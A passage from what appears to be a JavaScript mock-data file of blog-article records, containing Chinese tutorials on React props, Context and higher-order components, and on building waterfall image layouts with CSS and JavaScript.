          article_type: {
            id: 53,
            article_id: 53,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 53,
            user_id: 1,
            article_id: 53,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 14,
          name: 'React',
          color: 'rgba(0, 216, 255, 1)',
          createdAt: '2020-07-05T05:47:24.000Z',
          updatedAt: '2020-07-05T05:47:24.000Z',
        },
      ],
    },
    {
      id: 52,
      title: 'react跨组件传值',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '## props\n\n一层一层的传递，app组件通过props一层一层的往下传给ProfileHeader组件，期间通过了Profile组件，但Profile组件并不需要props。\n\n```react\nimport React, { Component } from \'react\';\n\nfunction ProfileHeader(props) {\n  return (\n    <div>\n      <h2>用户昵称: {props.nickname}</h2>\n      <h2>用户等级: {props.level}</h2>\n    </div>\n  )\n}\n\nfunction Profile(props) {\n  return (\n    <div>\n      {/* <ProfileHeader nickname={props.nickname} level={props.level}/> */}\n      <ProfileHeader {...props} />\n      <ul>\n        <li>设置1</li>\n        <li>设置2</li>\n        <li>设置3</li>\n        <li>设置4</li>\n      </ul>\n    </div>\n  )\n}\n\nexport default class App extends Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      nickname: "context类组件",\n      level: 99\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        {/* <Profile nickname={this.state.nickname} level={this.state.level} /> */}\n        <Profile {...this.state} />\n      </div>\n    )\n  }\n}\n```\n\n## Context-类组件\n\n```react\nimport React, { Component } from \'react\';\n\nclass ProfileHeader extends Component {\n  render() {\n    // console.log(this.context);\n    return (\n      <div>\n        <h2>用户昵称: {this.context.nickname}</h2>\n        <h2>用户等级: {this.context.level}</h2>\n      </div>\n    )\n  }\n}\n\n// 创建Context对象\nconst MainContext = React.createContext({\n  nickname: "createContext的默认值",\n  level: -1,\n})\n\n\n/*\n  要使用contextType，必须要用类组件\n  如果ProfileHeader在React.createContext里面，则使用它的value值；\n  如果ProfileHeader不在React.createContext里面，则会使用React.createContext的默认值\n*/\nProfileHeader.contextType = MainContext;\n\nfunction Profile() {\n  return (\n    <div>\n      <ProfileHeader />\n      <ul>\n        <li>设置1</li>\n        <li>设置2</li>\n        <li>设置3</li>\n        <li>设置4</li>\n      </ul>\n    </div>\n  )\n}\n\nexport default class App extends Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      nickname: "context类组件",\n      level: 99\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        <MainContext.Provider value={this.state}>\n          <Profile />\n        </MainContext.Provider>\n        {/* <Profile /> */}\n      </div>\n    )\n  }\n}\n```\n\n## Context-函数组件\n\n```react\nimport React, { Component } from \'react\';\n\n// 创建Context对象\nconst MainContext = React.createContext({\n  nickname: "createContext的默认值",\n  level: -1\n})\n\nfunction ProfileHeader() {\n  return (\n    <MainContext.Consumer>\n      {\n        value => {\n          return (\n            <div>\n              <h2>用户昵称: {value.nickname}</h2>\n              <h2>用户等级: {value.level}</h2>\n            </div>\n          )\n        }\n      }\n    </MainContext.Consumer>\n  )\n}\n\nfunction Profile() {\n  return (\n    <div>\n      <ProfileHeader />\n      <ul>\n        <li>设置1</li>\n        <li>设置2</li>\n        <li>设置3</li>\n        <li>设置4</li>\n      </ul>\n    </div>\n  )\n}\n\nexport default class App extends Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      nickname: "context函数组件",\n      level: 99\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        <MainContext.Provider value={this.state}>\n          <Profile />\n        </MainContext.Provider>\n      </div>\n    )\n  }\n}\n```\n\n## 多个Context-类组件\n\n```react\nimport React, { Component } from \'react\';\n\n// 创建Context对象\nconst MainContext = React.createContext({\n  nickname: "aaaa",\n  level: -1,\n})\n\nconst ThemeContext = React.createContext({\n  color: "red",\n})\n\nclass ProfileHeader extends Component {\n  // jsx -> 嵌套的方式\n  render() {\n    return (\n      <MainContext.Consumer>\n        {\n          value => {\n            return (\n              <ThemeContext.Consumer>\n                {\n                  theme => {\n                    return (\n                      <div>\n                        <h2>用户昵称: {value.nickname}</h2>\n                        <h2>用户等级: {value.level}</h2>\n                        <h2 style={{ color: theme.color }}>颜色: {theme.color}</h2>\n                      </div>\n                    )\n                  }\n                }\n              </ThemeContext.Consumer>\n            )\n          }\n        }\n      </MainContext.Consumer>\n    )\n  }\n\n}\n\nfunction Profile() {\n  return (\n    <div>\n      <ProfileHeader />\n      <ul>\n        <li>设置1</li>\n        <li>设置2</li>\n        <li>设置3</li>\n        <li>设置4</li>\n      </ul>\n    </div>\n  )\n}\n\nexport default class App extends Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      nickname: "kobe",\n      level: 99\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        <MainContext.Provider value={this.state}>\n          <ThemeContext.Provider value={{ color: "red" }}>\n            <Profile />\n          </ThemeContext.Provider>\n        </MainContext.Provider>\n      </div>\n    )\n  }\n}\n```\n\n## 多个Context-函数组件\n\n```react\nimport React, { Component } from \'react\';\n\n// 创建Context对象\nconst MainContext = React.createContext({\n  nickname: "aaaa",\n  level: -1,\n})\n\nconst ThemeContext = React.createContext({\n  color: "red",\n})\n\nfunction ProfileHeader() {\n  // jsx -> 嵌套的方式\n  return (\n    <MainContext.Consumer>\n      {\n        value => {\n          return (\n            <ThemeContext.Consumer>\n              {\n                theme => {\n                  return (\n                    <div>\n                      <h2>用户昵称: {value.nickname}</h2>\n                      <h2>用户等级: {value.level}</h2>\n                      <h2 style={{ color: theme.color }}>颜色: {theme.color}</h2>\n                    </div>\n                  )\n                }\n              }\n            </ThemeContext.Consumer>\n          )\n        }\n      }\n    </MainContext.Consumer>\n  )\n\n}\n\nfunction Profile() {\n  return (\n    <div>\n      <ProfileHeader />\n      <ul>\n        <li>设置1</li>\n        <li>设置2</li>\n        <li>设置3</li>\n        <li>设置4</li>\n      </ul>\n    </div>\n  )\n}\n\nexport default class App extends Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      nickname: "kobe",\n      level: 99\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        <MainContext.Provider value={this.state}>\n          <ThemeContext.Provider value={{ color: "red" }}>\n            <Profile />\n          </ThemeContext.Provider>\n        </MainContext.Provider>\n      </div>\n    )\n  }\n}\n```\n\n## 属性展开\n\n如果你已经有了一个 props 对象，你可以使用展开运算符 `...` 来在 JSX 中传递整个 props 对象。以下两个组件是等价的：\n\n```react\nfunction App1() {\n  return <Greeting firstName="Ben" lastName="Hector" />;\n}\n\nfunction App2() {\n  const props = {firstName: \'Ben\', lastName: \'Hector\'};\n  return <Greeting {...props} />;\n}\n```\n\n',
      click: 17,
      createdAt: '2020-10-14T13:20:31.000Z',
      updatedAt: '2021-02-16T13:16:57.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 52,
            article_id: 52,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 52,
            user_id: 1,
            article_id: 52,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 14,
          name: 'React',
          color: 'rgba(0, 216, 255, 1)',
          createdAt: '2020-07-05T05:47:24.000Z',
          updatedAt: '2020-07-05T05:47:24.000Z',
        },
      ],
    },
    {
      id: 51,
      title: 'react父子传值',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 父传子\n\n## 类组件\n\n```react\nimport React, { Component } from \'react\';\n\n\n// 子组件\nclass ChildCpn extends Component {\n  // 如果只是下面的形式，可以省略\n  // constructor(props) {\n  //   super(props);\n  // }\n\n  render() {\n    const { name, age, height } = this.props;\n    return (\n      <h2>子组件展示数据: {name + " " + age + " " + height}</h2>\n    )\n  }\n}\n\n// 父组件\nexport default class App extends Component {\n  render() {\n    return (\n      <div>\n        <ChildCpn name="hss" age="21" height="1.7" />\n        <ChildCpn name="kobe" age="40" height="1.98" />\n      </div>\n    )\n  }\n}\n```\n\n## 函数组件\n\n```react\nimport React, { Component } from \'react\';\n\n// 子组件\nfunction ChildCpn(props) {\n  const { name, age, height } = props;\n\n  return (\n    <h2>{name + age + height}</h2>\n  )\n}\n\n// 父组件\nexport default class App extends Component {\n  render() {\n    return (\n      <div>\n        <ChildCpn name="hss" age="21" height="1.7" />\n        <ChildCpn name="kobe" age="40" height="1.98" />\n      </div>\n    )\n  }\n}\n```\n\n\n\n# 子传父\n\n## 函数传递\n\n```react\nimport React, { Component } from \'react\';\n\n// 子组件\nclass CounterButton extends Component {\n  render() {\n    const { onClick } = this.props;\n    return <button onClick={onClick}>+1</button>\n  }\n}\n\n// 父组件\nexport default class App extends Component {\n  constructor(props) {\n    super(props);\n\n    this.state = {\n      counter: 0\n    }\n  }\n\n  render() {\n    return (\n      <div>\n        <h2>当前计数: {this.state.counter}</h2>\n        <button onClick={e => this.increment()}>+</button>\n        <CounterButton onClick={e => this.increment()} name="why" />\n      </div>\n    )\n  }\n\n  increment() {\n    this.setState({\n      counter: this.state.counter + 1\n    })\n  }\n}\n```\n\n',
      click: 11,
      createdAt: '2020-10-14T13:19:59.000Z',
      updatedAt: '2021-02-16T13:16:48.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 51,
            article_id: 51,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 51,
            user_id: 1,
            article_id: 51,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 14,
          name: 'React',
          color: 'rgba(0, 216, 255, 1)',
          createdAt: '2020-07-05T05:47:24.000Z',
          updatedAt: '2020-07-05T05:47:24.000Z',
        },
      ],
    },
    {
      id: 50,
      title: 'react高阶组件',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        '# 高阶组件\n\n> 高阶组件的英文是 Higher-Order Components，简称为 HOC；\n> 官方的定义：高阶组件是参数为组件，返回值为新组件的函数；\n> 我们可以进行如下的解析： p 首先， 高阶组件 本身不是一个组件，而是一个函数；\n> 其次，这个函数的参数是一个组件，返回值也是一个组件；\n\n## 定义\n\n```react\nimport React, { PureComponent } from \'react\'\n\nclass App extends PureComponent {\n  render() {\n    console.log(this.props);\n    return (\n      <div>\n        App: {this.props.name}\n      </div>\n    )\n  }\n}\n\n// 类组件\n// function enhanceComponent(WrappedComponent) {\n//   class NewComponent extends PureComponent {\n//     render() {\n//       // return <WrappedComponent name={this.props.name} />\n//       return <WrappedComponent {...this.props} />\n//     }\n//   }\n\n//   NewComponent.displayName = "Kobe";\n//   return NewComponent;\n// }\n\n// 函数组件\nfunction enhanceComponent(WrappedComponent) {\n  function NewComponent(props) {\n    return <WrappedComponent {...props}/>\n  }\n\n  NewComponent.displayName = "Kobe";\n  return NewComponent;\n}\n\nconst EnhanceComponent = enhanceComponent(App);\n\nexport default EnhanceComponent;\n```\n\n## 应用1-增强props\n\n```react\nimport React, { PureComponent } from \'react\';\n\n// 定义一个高阶组件\nfunction enhanceRegionProps(WrappedComponent) {\n  return function aaa(props){\n    return <WrappedComponent {...props} region="中国"/>\n  }\n  // return props => {\n  //   return <WrappedComponent {...props} region="中国"/>\n  // }\n\n  /*  为什么props有值\n      因为调用enhanceRegionProps高阶组件(本质还是函数),\n      会返回一个函数(也可以说是函数组件),\n      然后const EnhanceHome = enhanceRegionProps(Home),\n      调用了enhanceRegionProps高阶组件(函数)，\n      返回了一个aaa函数(函数组件)给EnhanceHome,\n      等于EnhanceHome就aaa函数(函数组件),\n      然后<EnhanceHome nickname="coderwhy" level={90}/>\n      这里EnhanceHome就是函数组件了，\n      因此nickname和level都可以通过aaa函数的形参props获取\n  */\n}\n\nclass Home extends PureComponent {\n  render() {\n    return <h2>Home: {`昵称: ${this.props.nickname} 等级: ${this.props.level} 区域: ${this.props.region}`}</h2>\n  }\n}\n\n\nclass About extends PureComponent {\n  render() {\n    return <h2>About: {`昵称: ${this.props.nickname} 等级: ${this.props.level} 区域: ${this.props.region}`}</h2>\n  }\n}\n\n\n/*\n  一般情况下是默认导出Home组件，然后其他地方import Home from \'\'\n  别人以为导入的是Home，其实导入的是这里导出的enhanceRegionProps(Home)\n  然后就可以在其他地方直接使用<Home />和<About />\n  export default enhanceRegionProps(Home);\n  export default enhanceRegionProps(About);\n*/\n\n// 这里因为没有导出，想用enhanceRegionProps(Home)就得这样\nconst EnhanceHome = enhanceRegionProps(Home);\nconst EnhanceAbout = enhanceRegionProps(About);\n\nclass App extends PureComponent {\n  render() {\n    return (\n      <div>\n        App\n        <EnhanceHome nickname="coderwhy" level={90}/>\n        <EnhanceAbout nickname="kobe" level={99}/>\n      </div>\n    )\n  }\n}\n\nexport default App;\n\nimport React, { PureComponent } from \'react\';\n\n// 定义一个高阶组件\nfunction enhanceRegionProps(WrappedComponent) {\n  return function aaa(props){\n    return <WrappedComponent {...props} region="中国"/>\n  }\n  // return props => {\n  //   return <WrappedComponent {...props} region="中国"/>\n  // }\n\n  /*  为什么props有值\n      因为调用enhanceRegionProps高阶组件(本质还是函数),\n      会返回一个函数(也可以说是函数组件),\n      然后const EnhanceHome = enhanceRegionProps(Home),\n      调用了enhanceRegionProps高阶组件(函数)，\n      返回了一个aaa函数(函数组件)给EnhanceHome,\n      等于EnhanceHome就aaa函数(函数组件),\n      然后<EnhanceHome nickname="coderwhy" level={90}/>\n      这里EnhanceHome就是函数组件了，\n      因此nickname和level都可以通过aaa函数的形参props获取\n  */\n}\n\nclass Home extends PureComponent {\n  render() {\n    return <h2>Home: {`昵称: ${this.props.nickname} 等级: ${this.props.level} 区域: ${this.props.region}`}</h2>\n  }\n}\n\n\nclass About extends PureComponent {\n  render() {\n    return <h2>About: {`昵称: ${this.props.nickname} 等级: ${this.props.level} 区域: ${this.props.region}`}</h2>\n  }\n}\n\n\n/*\n  一般情况下是默认导出Home组件，然后其他地方import Home from \'\'\n  别人以为导入的是Home，其实导入的是这里导出的enhanceRegionProps(Home)\n  然后就可以在其他地方直接使用<Home />和<About />\n  export default enhanceRegionProps(Home);\n  export default enhanceRegionProps(About);\n*/\n\n// 这里因为没有导出，想用enhanceRegionProps(Home)就得这样\nconst EnhanceHome = enhanceRegionProps(Home);\nconst EnhanceAbout = enhanceRegionProps(About);\n\nclass App extends PureComponent {\n  render() {\n    return (\n      <div>\n        App\n        <EnhanceHome nickname="coderwhy" level={90}/>\n        <EnhanceAbout nickname="kobe" level={99}/>\n      </div>\n    )\n  }\n}\n\nexport default App;\n```\n\n## 应用2-增强props-Context-默认\n\n```react\nimport React, { PureComponent, createContext } from \'react\';\n\n// 创建Context\nconst UserContext = createContext({\n  nickname: "默认",\n  level: -1,\n  region: "世界"\n});\n\nclass Home extends PureComponent {\n  render() {\n    return (\n      <UserContext.Consumer>\n        {\n          user => {\n            return <h2>Home: {`昵称: ${user.nickname} 等级: ${user.level} 区域: ${user.region}`}</h2>\n          }\n        }\n      </UserContext.Consumer>\n    )\n  }\n}\n\nclass About extends PureComponent {\n  render() {\n    return (\n      <UserContext.Consumer>\n        {\n          user => {\n            return <h2>About: {`昵称: ${user.nickname} 等级: ${user.level} 区域: ${user.region}`}</h2>\n          }\n        }\n      </UserContext.Consumer>\n    )\n  }\n}\n\nclass App extends PureComponent {\n  render() {\n    return (\n      <div>\n        App\n        <UserContext.Provider value={{ nickname: "why", level: 90, region: "中国" }}>\n          <Home />\n          <About />\n        </UserContext.Provider>\n      </div>\n    )\n  }\n}\n\nexport default App;\n```\n\n## 应用3-增强props-Context-改进\n\n```react\nimport React, { PureComponent, createContext } from \'react\';\n\n// 定义一个高阶组件\nfunction withUser(WrappedComponent) {\n  // 返回一个函数组件\n  return props => {\n    // 返回jsx\n    return (\n      <UserContext.Consumer>\n        {\n          user => {\n            // 给WrappedComponent传props值(如：<UserHome pwd={123456}/>的pwd)\n            // 以及context的value值(这里起user别名)，<UserContext.Provider value...>\n            // 然后WrappedComponent组件(即withUser这个高阶组件的形参)就能拥有props的值和context的值了\n            // 约等于父子组件传值，父组件将{...props} {...user}数据传给WrappedComponent子组件\n\n            // return <WrappedComponent \n            //           nickname={user.nickname}\n            //           level={user.level}\n            //           region={user.region}\n            //           pwd={props.pwd}\n            //           hobby={props.hobby}\n            //         />\n            return <WrappedComponent {...props} {...user}/>\n          } \n        }\n      </UserContext.Consumer>\n    )\n  }\n}\n\n// 创建Context\nconst UserContext = createContext({\n  nickname: "默认",\n  level: -1,\n  region: "世界"\n});\n\nclass Home extends PureComponent {\n  render() {\n    return <h2>Home: {`昵称: ${this.props.nickname} 密码: ${this.props.pwd} 等级: ${this.props.level} 区域: ${this.props.region}`}</h2>\n  }\n}\n\n\nclass About extends PureComponent {\n  render() {\n    return <h2>About: {`昵称: ${this.props.nickname} 密码: ${this.props.hobby} 等级: ${this.props.level} 区域: ${this.props.region}`}</h2>\n  }\n}\n\nclass Detail extends PureComponent {\n  render() {\n    return (\n      <ul>\n        <li>{this.props.nickname}</li>\n        <li>{this.props.level}</li>\n        <li>{this.props.region}</li>\n      </ul>\n    )\n  }\n}\n\n\nconst UserHome = withUser(Home);\nconst UserAbout = withUser(About);\nconst UserDetail = withUser(Detail);\n\nclass App extends PureComponent {\n  render() {\n    return (\n      <div>\n        App\n        <UserContext.Provider value={{nickname: "why", level: 90, region: "中国"}}>\n          <UserHome pwd={123456}/>\n          <UserAbout hobby={\'coding\'}/>\n          <UserDetail/>\n        </UserContext.Provider>\n      </div>\n    )\n  }\n}\n\nexport default App;\n```\n\n## 应用3-登录鉴权\n\n```react\n\n```\n',
      click: 9,
      createdAt: '2020-10-14T13:19:07.000Z',
      updatedAt: '2021-02-16T13:16:31.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 50,
            article_id: 50,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 50,
            user_id: 1,
            article_id: 50,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 14,
          name: 'React',
          color: 'rgba(0, 216, 255, 1)',
          createdAt: '2020-07-05T05:47:24.000Z',
          updatedAt: '2020-07-05T05:47:24.000Z',
        },
      ],
    },
    {
      id: 49,
      title: '四种方式实现瀑布流',
      is_comment: 1,
      status: 1,
      img: '/1611639110298pubuliu.png',
      content:
        '## css3的column属性实现\n\n> 外层容器设置column-count(改变列数)和column-gap(改变间隙)，即可实现瀑布流布局\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>css瀑布流</title>\n    <style>\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        .wrap {\n            column-count: 4;\n            /* column-gap：间隙，不设置的话，默认16px */\n            column-gap: 10px;\n        }\n\n        .wrap .item {\n            width: 100%;\n            margin-bottom: 15px;\n            /* 避免元素内部断行并产生新列 */\n            break-inside: avoid;\n        }\n\n        .wrap .item img {\n            display: block;\n            width: 100%;\n            height: auto;\n        }\n    </style>\n</head>\n\n<body>\n    <div class="wrap">\n        <div class="item">\n            <img src="./img/1.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/2.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/3.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/4.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/5.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/6.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/7.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/8.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/9.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/10.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/11.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/12.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/13.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/14.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/15.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/16.jpg" alt="">\n        </div>\n    </div>\n</body>\n\n</html>\n```\n\n\n\n## float实现\n\n> 利用多列浮动实现\n>\n> 缺点：一列有几张图就显示几张图\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>css瀑布流</title>\n    <style>\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        .wrap {}\n\n        .wrap .wrap-float {\n            width: 30%;\n            float: left;\n            margin-left: 3%;\n        }\n\n        .wrap .wrap-float .item {\n            width: 100%;\n            margin-bottom: 15px;\n        }\n\n        .wrap .wrap-float .item img {\n            display: block;\n            width: 100%;\n        }\n    </style>\n</head>\n\n<body>\n    <div class="wrap">\n        <div class="wrap-float">\n            <div class="item">\n                <img src="./img/1.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/2.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/3.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/4.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/5.jpg" alt="">\n            </div>\n        </div>\n        <div class="wrap-float">\n            <div class="item">\n                <img src="./img/6.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/7.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/8.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/9.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/10.jpg" alt="">\n            </div>\n        </div>\n        <div class="wrap-float">\n            <div class="item">\n                <img src="./img/11.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/12.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/13.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/14.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/15.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/16.jpg" alt="">\n            </div>\n        </div>\n\n    </div>\n</body>\n\n</html>\n```\n\n\n\n## flex布局实现\n\n> 和float差不多，都是利用多列模拟瀑布流\n>\n> flex-direction: row，将flexbox设置成横向（行）排列\n>\n> flex-direction: column，将flexbox设置纵向（列）排列\n>\n> 在外层容器设置display:flex，flex-direction: row，这样里层的内容就会横向排列，\n>\n> 然后再里层设置flex-direction: column，这样里层的内容就会全部纵向排列，里层有几个div，就代表有几列。\n>\n> 缺点：和float差不多，一列有几张图就显示几张图\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>css瀑布流</title>\n    <style>\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        .wrap {\n            display: flex;\n            flex-direction: row;\n        }\n\n        .wrap .wrap-column {\n            width: 33%;\n            box-sizing: border-box;\n            padding: 10px;\n            flex-direction: column;\n        }\n\n        .wrap .wrap-column .item {\n            width: 100%;\n            margin-bottom: 15px;\n        }\n\n        .wrap .wrap-column .item img {\n            display: block;\n            width: 100%;\n            height: auto;\n        }\n    </style>\n</head>\n\n<body>\n    <div class="wrap">\n        <div class="wrap-column">\n            <div class="item">\n                <img src="./img/1.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/2.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/3.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/4.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/5.jpg" alt="">\n            </div>\n        </div>\n        <div class="wrap-column">\n            <div class="item">\n                <img src="./img/6.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/7.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/8.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/9.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/10.jpg" alt="">\n            </div>\n        </div>\n        <div class="wrap-column">\n            <div class="item">\n                <img src="./img/11.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/12.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/13.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/14.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/15.jpg" alt="">\n            </div>\n            <div class="item">\n                <img src="./img/16.jpg" alt="">\n            </div>\n        </div>\n\n    </div>\n</body>\n\n</html>\n```\n\n## js实现\n\n> 利用js计算出每张图片该显示的位置，利用定位进行显示\n>\n> 瀑布流每张图片的宽度都是固定的，不同的是每张图片的高度，利用这一点，可以确定第一行的图片的张数，以及第一行每张图片的offsetHieght值，将第一行每张（或者说每一列）的offsetHieght值保存在一个数组里，然后从第二行的第一张图片开始，找到数组里面最小的offsetHieght，通过这个值，计算出第二行第一张图片的位置，然后将其定为在该位置，然后重新计算修改offsetHieght数组，让它保存最新的每一列的offsetHeight值，然后第二张的第二张图片又继续找数组里面的最小的offsetHieght，找到后将图片放到该位置后继续修改offsetHieght数组，遍历所有图片后即可实现瀑布流效果！\n>\n> 注意：由于要操作dom，需要在浏览器加载完所有图片后再进行操作\n\n```html\n<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>css瀑布流</title>\n    <style>\n        body {\n            margin: 0;\n            padding: 0;\n        }\n\n        /* img {\n            display: block;\n            width: 100%;\n        } */\n    </style>\n</head>\n\n<body>\n    <div class="wrap">\n        <div class="item">\n            <img src="./img/1.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/2.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/3.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/4.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/5.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/6.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/7.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/8.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/9.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/10.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/11.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/12.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/13.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/14.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/15.jpg" alt="">\n        </div>\n        <div class="item">\n            <img src="./img/16.jpg" alt="">\n        </div>\n    </div>\n</body>\n\n<script>\n    window.onload = function () {\n        // 获取数组最小值的下标\n        function getMinIndex(arr) {\n            return [].indexOf.call(arr, Math.min.apply(null, arr))\n        }\n        // 列数\n        const column = 3;\n        // 间隙\n        const gap = 10;\n\n        const wrap = document.getElementsByClassName("wrap")\n        const item = wrap[0].getElementsByClassName("item")\n        const width1 = window.getComputedStyle(wrap[0], null)[\'width\'];\n        const width2 = width1.slice(0, width1.length - 2) - ((column - 1) * gap)\n        // 计算减去间隙后，每个item的平均宽度\n        const width = width2 / column\n        // 保存当前列的offsetHeight的高度\n        const offsetList = []\n        wrap[0].style.position = "relative"\n        for (let i = 0; i < item.length; i++) {\n            item[i].getElementsByTagName("img")[0].style.width = "100%"\n            item[i].getElementsByTagName("img")[0].style.display = "block"\n            item[i].style.position = \'absolute\'\n            item[i].style.width = width + "px";\n\n            if (i < column) {\n                // 将第一行的offsetHeight都保存在数组里\n                offsetList.push(item[i].offsetHeight)\n                item[i].style.top = "0";\n                if ((i + 1) % column == 1) {\n                    